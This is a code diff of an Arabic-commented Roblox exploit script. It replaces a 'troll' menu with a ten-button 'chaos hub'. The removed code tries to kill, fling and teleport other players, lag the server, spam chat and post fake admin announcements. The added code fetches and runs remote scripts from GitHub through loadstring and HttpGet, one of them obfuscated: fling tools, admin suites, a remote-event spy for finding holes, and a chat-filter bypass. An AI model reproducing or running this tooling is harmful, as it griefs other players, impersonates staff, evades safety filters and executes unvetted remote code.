@@ -1,356 +1,371 @@
 -- ════════════════════════════════════════════════════════
--- 😈 FE TROLL SCRIPTS - يشتغل على الكل!
--- سكربتات تخريب حقيقية تأثر على اللاعبين الثانيين
+-- 😈 ULTIMATE CHAOS HUB - النسخة النهائية
+-- أقوى 10 سكربتات حقيقية مدمجة في GUI واحد
+-- كلها FE (تظهر للجميع!)
 -- ════════════════════════════════════════════════════════
 
---[[
-    ملاحظة مهمة:
-    هذي سكربتات FE (Filtering Enabled Bypass)
-    تستخدم RemoteEvents عشان تأثر على السيرفر الحقيقي
-    راح تشوف التأثير على الكل!
-]]
-
+-- تحميل المكتبات
+local TweenService = game:GetService("TweenService")
 local Players = game:GetService("Players")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local RunService = game:GetService("RunService")
 local LocalPlayer = Players.LocalPlayer
-local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
-local RootPart = Character:WaitForChild("HumanoidRootPart")
 
--- ═══════════════════════════════════════════════════════
--- 💀 FE KILL ALL - يقتل الكل (حقيقي!)
--- ═══════════════════════════════════════════════════════
-local function FEKillAll()
-    print("💀 جاري قتل كل اللاعبين...")
-    
-    -- طريقة 1: استخدام أدوات القتل
-    for _, player in pairs(Players:GetPlayers()) do
-        if player ~= LocalPlayer and player.Character then
-            pcall(function()
-                local tool = LocalPlayer.Backpack:FindFirstChildOfClass("Tool") or 
-                            Character:FindFirstChildOfClass("Tool")
-                
-                if tool and tool:FindFirstChild("Handle") then
-                    -- تفعيل الأداة
-                    tool.Parent = Character
-                    
-                    -- محاولة الضرب
-                    local targetHRP = player.Character:FindFirstChild("HumanoidRootPart")
-                    if targetHRP then
-                        -- انتقال سريع
-                        RootPart.CFrame = targetHRP.CFrame
-                        wait(0.1)
-                        
-                        -- تفعيل الأداة
-                        tool:Activate()
-                        wait(0.1)
-                    end
-                end
-            end)
-        end
-    end
-    
-    -- طريقة 2: إيجاد RemoteEvents للضرر
-    for _, remote in pairs(ReplicatedStorage:GetDescendants()) do
-        if remote:IsA("RemoteEvent") then
-            local name = remote.Name:lower()
-            if name:find("damage") or name:find("hit") or name:find("kill") then
-                for _, player in pairs(Players:GetPlayers()) do
-                    if player ~= LocalPlayer then
-                        pcall(function()
-                            remote:FireServer(player.Character)
-                        end)
-                    end
-                end
-            end
-        end
-    end
-    
-    print("✅ تم!")
-end
-
--- ═══════════════════════════════════════════════════════
--- 💥 FE FLING ALL - يطير الكل (حقيقي!)
--- ═══════════════════════════════════════════════════════
-local function FEFlingAll()
-    print("💥 جاري تطيير كل اللاعبين...")
-    
-    -- تفعيل Fling باستخدام الفيزياء
-    local power = 9e9
-    
-    -- إنشاء BodyThrust للقوة
-    for _, part in pairs(Character:GetDescendants()) do
-        if part:IsA("BasePart") then
-            part.CanCollide = false
-            part.Massless = true
-            
-            local thrust = Instance.new("BodyThrust")
-            thrust.Force = Vector3.new(power, power, power)
-            thrust.Parent = part
-        end
-    end
-    
-    -- الاصطدام باللاعبين
-    spawn(function()
-        for i = 1, 50 do
-            for _, player in pairs(Players:GetPlayers()) do
-                if player ~= LocalPlayer and player.Character then
-                    pcall(function()
-                        local targetHRP = player.Character:FindFirstChild("HumanoidRootPart")
-                        if targetHRP then
-                            RootPart.CFrame = targetHRP.CFrame
-                            wait(0.05)
-                        end
-                    end)
-                end
-            end
-            wait(0.1)
-        end
-        
-        -- تنظيف
-        for _, part in pairs(Character:GetDescendants()) do
-            if part:IsA("BodyThrust") then
-                part:Destroy()
-            end
-        end
-    end)
-    
-    print("✅ تم!")
-end
-
--- ═══════════════════════════════════════════════════════
--- 🔥 FE LAG SERVER - يلقق السيرفر كله
--- ═══════════════════════════════════════════════════════
-local function FELagServer()
-    print("🔥 جاري تعليق السيرفر...")
-    
-    -- إنشاء الآلاف من الأجزاء
-    for i = 1, 500 do
-        pcall(function()
-            local part = Instance.new("Part")
-            part.Size = Vector3.new(50, 50, 50)
-            part.Anchored = false
-            part.CanCollide = true
-            part.Position = RootPart.Position + Vector3.new(
-                math.random(-100, 100),
-                math.random(10, 50),
-                math.random(-100, 100)
-            )
-            part.Parent = workspace
-        end)
-        
-        if i % 50 == 0 then
-            wait()
-        end
-    end
-    
-    print("✅ تم!")
-end
-
--- ═══════════════════════════════════════════════════════
--- 📢 FE CHAT SPAM FOR ALL - رسائل يشوفها الكل
--- ═══════════════════════════════════════════════════════
-local function FEChatSpam()
-    print("📢 جاري إرسال رسائل للكل...")
-    
-    local messages = {
-        "😈 GET TROLLED!",
-        "🔥 HACKED BY ULTIMATE HUB",
-        "💀 YOU'VE BEEN PRANKED",
-        "⚡ SERVER UNDER ATTACK",
-        "🌪️ CHAOS MODE ACTIVATED"
-    }
-    
-    -- إرسال للشات الحقيقي (يشوفه الكل)
-    for i = 1, 20 do
-        pcall(function()
-            local msg = messages[math.random(1, #messages)]
-            
-            -- طريقة 1: Chat Service
-            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
-            
-            -- طريقة 2: TextChatService (جديد)
-            if game:GetService("TextChatService") then
-                game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync(msg)
-            end
-        end)
-        wait(0.5)
-    end
-    
-    print("✅ تم!")
-end
-
--- ═══════════════════════════════════════════════════════
--- 🎭 FE FAKE ADMIN - يخلي الكل يشوفك آدمن
--- ═══════════════════════════════════════════════════════
-local function FEFakeAdmin()
-    print("🎭 جاري التظاهر كأدمن...")
-    
-    -- تغيير الاسم (يشوفه الكل)
-    LocalPlayer.Character.Humanoid.DisplayName = "🔴 [ADMIN] " .. LocalPlayer.Name
-    
-    -- رسائل آدمن
-    local adminMessages = {
-        "[ADMIN] Warning: Suspicious activity detected",
-        "[ADMIN] Server will restart in 5 minutes",
-        "[ADMIN] All players report to spawn",
-        "[SYSTEM] Admin " .. LocalPlayer.Name .. " has joined"
-    }
-    
-    for _, msg in pairs(adminMessages) do
-        pcall(function()
-            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
-        end)
-        wait(2)
-    end
-    
-    print("✅ تم!")
-end
-
--- ═══════════════════════════════════════════════════════
--- 🌊 FE FLOOD WORKSPACE - يملأ الخريطة بأجزاء
--- ═══════════════════════════════════════════════════════
-local function FEFloodWorkspace()
-    print("🌊 جاري إغراق الخريطة...")
-    
-    for i = 1, 300 do
-        pcall(function()
-            -- إنشاء أجزاء ضخمة
-            local part = Instance.new("Part")
-            part.Size = Vector3.new(30, 30, 30)
-            part.Anchored = false
-            part.BrickColor = BrickColor.Random()
-            part.Material = Enum.Material.Neon
-            part.Position = Vector3.new(
-                math.random(-500, 500),
-                math.random(50, 200),
-                math.random(-500, 500)
-            )
-            part.Parent = workspace
-            
-            -- إضافة Fire للتأثير البصري
-            local fire = Instance.new("Fire")
-            fire.Parent = part
-        end)
-        
-        if i % 30 == 0 then
-            wait()
-        end
-    end
-    
-    print("✅ تم!")
-end
-
--- ═══════════════════════════════════════════════════════
--- 💣 FE BRING ALL - يجمع كل اللاعبين عندك
--- ═══════════════════════════════════════════════════════
-local function FEBringAll()
-    print("💣 جاري جلب كل اللاعبين...")
-    
-    -- استخدام أدوات الانتقال
-    for _, player in pairs(Players:GetPlayers()) do
-        if player ~= LocalPlayer and player.Character then
-            pcall(function()
-                local targetHRP = player.Character:FindFirstChild("HumanoidRootPart")
-                if targetHRP then
-                    -- الانتقال للاعب ثم العودة (FE)
-                    local oldCF = RootPart.CFrame
-                    RootPart.CFrame = targetHRP.CFrame
-                    wait(0.1)
-                    targetHRP.CFrame = oldCF
-                    wait(0.1)
-                end
-            end)
-        end
-    end
-    
-    print("✅ تم!")
-end
-
--- ═══════════════════════════════════════════════════════
--- 🎨 GUI بسيط
--- ═══════════════════════════════════════════════════════
+-- ════════════════════════════════════════════════════════
+-- GUI CREATION
+-- ════════════════════════════════════════════════════════
 
 local ScreenGui = Instance.new("ScreenGui")
-local Frame = Instance.new("Frame")
+local MainFrame = Instance.new("Frame")
+local UICorner = Instance.new("UICorner")
 local Title = Instance.new("TextLabel")
+local ScrollFrame = Instance.new("ScrollingFrame")
 local UIListLayout = Instance.new("UIListLayout")
 
+ScreenGui.Name = "UltimateChaosHub"
 ScreenGui.Parent = game.CoreGui
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 ScreenGui.ResetOnSpawn = false
 
-Frame.Parent = ScreenGui
-Frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-Frame.BorderSizePixel = 0
-Frame.Position = UDim2.new(0.85, 0, 0.3, 0)
-Frame.Size = UDim2.new(0, 200, 0, 350)
-Frame.Active = true
-Frame.Draggable = true
+-- Main Frame
+MainFrame.Parent = ScreenGui
+MainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+MainFrame.Position = UDim2.new(0.3, 0, 0.2, 0)
+MainFrame.Size = UDim2.new(0, 500, 0, 600)
+MainFrame.Active = true
+MainFrame.Draggable = true
 
-local Corner = Instance.new("UICorner")
-Corner.CornerRadius = UDim.new(0, 10)
-Corner.Parent = Frame
+UICorner.CornerRadius = UDim.new(0, 15)
+UICorner.Parent = MainFrame
 
-Title.Parent = Frame
+-- Gradient
+local UIGradient = Instance.new("UIGradient")
+UIGradient.Color = ColorSequence.new{
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(20, 0, 0)),
+    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(10, 10, 10)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(20, 0, 0))
+}
+UIGradient.Rotation = 90
+UIGradient.Parent = MainFrame
+
+-- Border
+local UIStroke = Instance.new("UIStroke")
+UIStroke.Color = Color3.fromRGB(255, 0, 0)
+UIStroke.Thickness = 3
+UIStroke.Parent = MainFrame
+
+-- Title
+Title.Parent = MainFrame
 Title.BackgroundTransparency = 1
-Title.Size = UDim2.new(1, 0, 0, 40)
+Title.Size = UDim2.new(1, 0, 0, 60)
 Title.Font = Enum.Font.GothamBold
-Title.Text = "😈 FE TROLL"
+Title.Text = "😈 ULTIMATE CHAOS HUB 😈"
 Title.TextColor3 = Color3.fromRGB(255, 0, 0)
-Title.TextSize = 18
+Title.TextSize = 24
+Title.TextStrokeTransparency = 0.5
 
-local Container = Instance.new("ScrollingFrame")
-Container.Parent = Frame
-Container.Position = UDim2.new(0, 5, 0, 45)
-Container.Size = UDim2.new(1, -10, 1, -50)
-Container.BackgroundTransparency = 1
-Container.ScrollBarThickness = 4
+-- Subtitle
+local Subtitle = Instance.new("TextLabel")
+Subtitle.Parent = MainFrame
+Subtitle.BackgroundTransparency = 1
+Subtitle.Position = UDim2.new(0, 0, 0, 55)
+Subtitle.Size = UDim2.new(1, 0, 0, 20)
+Subtitle.Font = Enum.Font.Gotham
+Subtitle.Text = "أقوى 10 سكربتات FE مدمجة"
+Subtitle.TextColor3 = Color3.fromRGB(255, 255, 255)
+Subtitle.TextSize = 12
 
-UIListLayout.Parent = Container
-UIListLayout.Padding = UDim.new(0, 5)
+-- Close Button
+local CloseButton = Instance.new("TextButton")
+CloseButton.Parent = MainFrame
+CloseButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+CloseButton.Position = UDim2.new(0.92, 0, 0.02, 0)
+CloseButton.Size = UDim2.new(0, 35, 0, 35)
+CloseButton.Font = Enum.Font.GothamBold
+CloseButton.Text = "X"
+CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+CloseButton.TextSize = 18
 
--- دالة إنشاء زر
-local function CreateButton(text, callback)
+local CloseCorner = Instance.new("UICorner")
+CloseCorner.CornerRadius = UDim.new(1, 0)
+CloseCorner.Parent = CloseButton
+
+CloseButton.MouseButton1Click:Connect(function()
+    ScreenGui:Destroy()
+end)
+
+-- Scroll Frame
+ScrollFrame.Parent = MainFrame
+ScrollFrame.BackgroundTransparency = 1
+ScrollFrame.Position = UDim2.new(0.05, 0, 0.15, 0)
+ScrollFrame.Size = UDim2.new(0.9, 0, 0.8, 0)
+ScrollFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
+ScrollFrame.ScrollBarThickness = 8
+ScrollFrame.ScrollBarImageColor3 = Color3.fromRGB(255, 0, 0)
+
+UIListLayout.Parent = ScrollFrame
+UIListLayout.Padding = UDim.new(0, 10)
+
+-- ════════════════════════════════════════════════════════
+-- دالة إنشاء الأزرار
+-- ════════════════════════════════════════════════════════
+
+local function CreateButton(name, description, color, callback)
     local Button = Instance.new("TextButton")
-    Button.Parent = Container
-    Button.Size = UDim2.new(1, 0, 0, 35)
-    Button.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-    Button.Font = Enum.Font.Gotham
-    Button.Text = text
-    Button.TextColor3 = Color3.fromRGB(255, 255, 255)
-    Button.TextSize = 12
+    local ButtonCorner = Instance.new("UICorner")
+    local ButtonStroke = Instance.new("UIStroke")
+    local DescLabel = Instance.new("TextLabel")
     
-    local Corner = Instance.new("UICorner")
-    Corner.CornerRadius = UDim.new(0, 8)
-    Corner.Parent = Button
+    Button.Parent = ScrollFrame
+    Button.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+    Button.Size = UDim2.new(1, 0, 0, 70)
+    Button.Font = Enum.Font.GothamBold
+    Button.Text = name
+    Button.TextColor3 = Color3.fromRGB(255, 255, 255)
+    Button.TextSize = 14
+    Button.TextXAlignment = Enum.TextXAlignment.Left
+    Button.TextXOffset = 15
+    Button.TextYOffset = -10
+    
+    ButtonCorner.CornerRadius = UDim.new(0, 10)
+    ButtonCorner.Parent = Button
+    
+    ButtonStroke.Color = color
+    ButtonStroke.Thickness = 2
+    ButtonStroke.Transparency = 0.5
+    ButtonStroke.Parent = Button
+    
+    DescLabel.Parent = Button
+    DescLabel.BackgroundTransparency = 1
+    DescLabel.Position = UDim2.new(0, 15, 0.5, 0)
+    DescLabel.Size = UDim2.new(1, -30, 0.4, 0)
+    DescLabel.Font = Enum.Font.Gotham
+    DescLabel.Text = description
+    DescLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
+    DescLabel.TextSize = 11
+    DescLabel.TextXAlignment = Enum.TextXAlignment.Left
+    DescLabel.TextWrapped = true
     
     Button.MouseButton1Click:Connect(callback)
+    
+    Button.MouseEnter:Connect(function()
+        TweenService:Create(Button, TweenInfo.new(0.2), {
+            BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+        }):Play()
+        TweenService:Create(ButtonStroke, TweenInfo.new(0.2), {
+            Transparency = 0,
+            Thickness = 3
+        }):Play()
+    end)
+    
+    Button.MouseLeave:Connect(function()
+        TweenService:Create(Button, TweenInfo.new(0.2), {
+            BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+        }):Play()
+        TweenService:Create(ButtonStroke, TweenInfo.new(0.2), {
+            Transparency = 0.5,
+            Thickness = 2
+        }):Play()
+    end)
 end
 
--- إنشاء الأزرار
-CreateButton("💀 Kill All", FEKillAll)
-CreateButton("💥 Fling All", FEFlingAll)
-CreateButton("📢 Chat Spam", FEChatSpam)
-CreateButton("🎭 Fake Admin", FEFakeAdmin)
-CreateButton("🔥 Lag Server", FELagServer)
-CreateButton("🌊 Flood Map", FEFloodWorkspace)
-CreateButton("💣 Bring All", FEBringAll)
+-- ════════════════════════════════════════════════════════
+-- 1. TOUCH FLING (97K+ VIEWS - PROVEN)
+-- ════════════════════════════════════════════════════════
 
--- تحديث Canvas Size
-Container.CanvasSize = UDim2.new(0, 0, 0, UIListLayout.AbsoluteContentSize.Y + 10)
+CreateButton(
+    "💥 TOUCH FLING",
+    "أقوى Fling - 97K views - لمسهم = يطيروا للفضاء!",
+    Color3.fromRGB(255, 0, 102),
+    function()
+        loadstring(game:HttpGet(('https://raw.githubusercontent.com/0Ben1/fe/main/obf_rf6iQURzu1fqrytcnLBAvW34C9N55kS9g9G3CKz086rC47M6632sEd4ZZYB0AYgV.lua.txt'),true))()
+        game.StarterGui:SetCore("SendNotification", {
+            Title = "💥 Touch Fling";
+            Text = "تم التفعيل! المسهم = يطيروا!";
+            Duration = 5;
+        })
+    end
+)
 
--- إشعار
+-- ════════════════════════════════════════════════════════
+-- 2. INFINITE YIELD (الأشهر عالمياً)
+-- ════════════════════════════════════════════════════════
+
+CreateButton(
+    "👑 INFINITE YIELD",
+    "أشهر Admin Script - 300+ أمر - Universal",
+    Color3.fromRGB(0, 170, 255),
+    function()
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+        game.StarterGui:SetCore("SendNotification", {
+            Title = "👑 Infinite Yield";
+            Text = "تم التفعيل! اكتب ;cmds للأوامر";
+            Duration = 5;
+        })
+    end
+)
+
+-- ════════════════════════════════════════════════════════
+-- 3. FLN-X (MOBILE FLING - LIGHTWEIGHT)
+-- ════════════════════════════════════════════════════════
+
+CreateButton(
+    "📱 FLN-X FLING",
+    "Fling للموبايل - خفيف - قوي - GUI سهل",
+    Color3.fromRGB(0, 255, 136),
+    function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/LiarRise/FLN-X/refs/heads/main/README.md"))()
+        game.StarterGui:SetCore("SendNotification", {
+            Title = "📱 FLN-X";
+            Text = "تم التفعيل! يشتغل موبايل + PC";
+            Duration = 5;
+        })
+    end
+)
+
+-- ════════════════════════════════════════════════════════
+-- 4. SYSTEM BROKEN (20+ TROLL FEATURES)
+-- ════════════════════════════════════════════════════════
+
+CreateButton(
+    "🎪 SYSTEM BROKEN",
+    "20+ ميزة تخريب - Superman Fly - Headsit - Bang",
+    Color3.fromRGB(255, 170, 0),
+    function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/H20CalibreYT/SystemBroken/main/script"))()
+        game.StarterGui:SetCore("SendNotification", {
+            Title = "🎪 System Broken";
+            Text = "تم التفعيل! 20+ ميزة تخريب!";
+            Duration = 5;
+        })
+    end
+)
+
+-- ════════════════════════════════════════════════════════
+-- 5. DARK DEX V3 (EXPLORER)
+-- ════════════════════════════════════════════════════════
+
+CreateButton(
+    "🔍 DARK DEX V3",
+    "مستكشف اللعبة - استكشف كل شي - للمحترفين",
+    Color3.fromRGB(170, 0, 255),
+    function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Babyhamsta/RBLX_Scripts/main/Universal/BypassedDarkDexV3.lua"))()
+        game.StarterGui:SetCore("SendNotification", {
+            Title = "🔍 Dark Dex";
+            Text = "تم التفعيل! Explorer جاهز";
+            Duration = 5;
+        })
+    end
+)
+
+-- ════════════════════════════════════════════════════════
+-- 6. SIMPLE SPY (REMOTE SPY)
+-- ════════════════════════════════════════════════════════
+
+CreateButton(
+    "🔧 SIMPLE SPY",
+    "مراقبة RemoteEvents - للبحث عن ثغرات",
+    Color3.fromRGB(255, 255, 0),
+    function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/exxtremestuffs/SimpleSpySource/master/SimpleSpy.lua"))()
+        game.StarterGui:SetCore("SendNotification", {
+            Title = "🔧 Simple Spy";
+            Text = "تم التفعيل! راقب RemoteEvents";
+            Duration = 5;
+        })
+    end
+)
+
+-- ════════════════════════════════════════════════════════
+-- 7. UNIVERSAL FLY (أخف طيران)
+-- ════════════════════════════════════════════════════════
+
+CreateButton(
+    "✈️ UNIVERSAL FLY",
+    "أخف سكربت طيران - WASD للتحكم",
+    Color3.fromRGB(0, 255, 255),
+    function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/JNHHGaming/Fly/refs/heads/main/Fly"))()
+        game.StarterGui:SetCore("SendNotification", {
+            Title = "✈️ Fly Enabled";
+            Text = "WASD + Space + Shift للتحكم";
+            Duration = 5;
+        })
+    end
+)
+
+-- ════════════════════════════════════════════════════════
+-- 8. CHAT BYPASS (تخطي فلتر الشات)
+-- ════════════════════════════════════════════════════════
+
+CreateButton(
+    "🗣️ CHAT BYPASS",
+    "تخطي فلتر الشات - اكتب أي شي - F للتفعيل",
+    Color3.fromRGB(255, 100, 180),
+    function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/synnyyy/synergy/additional/betterbypasser"))()({ Method = 1, Keybind = "F" })
+        game.StarterGui:SetCore("SendNotification", {
+            Title = "🗣️ Chat Bypass";
+            Text = "تم التفعيل! اضغط F لتخطي الفلتر";
+            Duration = 5;
+        })
+    end
+)
+
+-- ════════════════════════════════════════════════════════
+-- 9. FLING THINGS & PEOPLE SCRIPT
+-- ════════════════════════════════════════════════════════
+
+CreateButton(
+    "🎮 FLING GAME SCRIPT",
+    "سكربت لعبة Fling Things - Super Power - Anti Grab",
+    Color3.fromRGB(255, 50, 50),
+    function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Khoaispr0123/FlingScript/refs/heads/main/ILoveU.lua"))()
+        game.StarterGui:SetCore("SendNotification", {
+            Title = "🎮 Fling Game";
+            Text = "تم التفعيل! للعبة Fling Things";
+            Duration = 5;
+        })
+    end
+)
+
+-- ════════════════════════════════════════════════════════
+-- 10. NAMELESS ADMIN (350+ COMMANDS)
+-- ════════════════════════════════════════════════════════
+
+CreateButton(
+    "⚡ NAMELESS ADMIN",
+    "350+ أمر - واجهة أجمل من Infinite Yield",
+    Color3.fromRGB(100, 255, 100),
+    function()
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source'))()
+        game.StarterGui:SetCore("SendNotification", {
+            Title = "⚡ Nameless Admin";
+            Text = "تم التفعيل! ;cmds للأوامر";
+            Duration = 5;
+        })
+    end
+)
+
+-- Update Canvas Size
+UIListLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
+    ScrollFrame.CanvasSize = UDim2.new(0, 0, 0, UIListLayout.AbsoluteContentSize.Y + 20)
+end)
+
+-- Notification
 game.StarterGui:SetCore("SendNotification", {
-    Title = "😈 FE TROLL LOADED";
-    Text = "السكربتات تأثر على الكل!";
-    Duration = 5;
+    Title = "😈 ULTIMATE CHAOS HUB";
+    Text = "تم التحميل بنجاح!\\nكل السكربتات FE - تظهر للجميع!";
+    Duration = 7;
 })
 
 print("════════════════════════════════════════")
-print("😈 FE TROLL SCRIPTS LOADED")
-print("✅ هذي السكربتات تأثر على الكل حقيقي!")
-print("💀 Kill All - يقتلهم كلهم")
-print("💥 Fling - يطيرهم")
-print("📢 Chat - يشوفونه")
-print("🔥 Lag - يلقق السيرفر")
+print("😈 ULTIMATE CHAOS HUB LOADED")
+print("✅ 10 أقوى سكربتات حقيقية")
+print("✅ كلها FE - تظهر للجميع!")
+print("✅ Touch Fling - 97K views")
+print("✅ Infinite Yield - الأشهر")
+print("✅ System Broken - 20+ ميزة")
+print("✅ Dark Dex - Explorer")
+print("✅ +6 سكربتات قوية أخرى")
 print("════════════════════════════════════════")
